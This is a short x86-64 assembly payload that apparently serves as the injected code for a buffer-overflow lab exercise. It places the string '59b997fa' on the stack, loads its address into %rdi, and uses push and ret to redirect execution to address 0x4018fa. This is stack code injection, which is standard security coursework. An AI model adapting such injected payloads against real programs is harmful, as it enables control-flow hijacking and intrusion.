movq %rsp, %rax
subq $0x1024, %rsp
movb $0x35, (%rsp)
movb $0x39, 1(%rsp)
movb $0x62, 2(%rsp)
movb $0x39, 3(%rsp)
movb $0x39, 4(%rsp)
movb $0x37, 5(%rsp)
movb $0x66, 6(%rsp)
movb $0x61, 7(%rsp)
movb $0x00, 8(%rsp)
movq %rsp, %rdi
movq %rax, %rsp
pushq $0x4018fa
retq
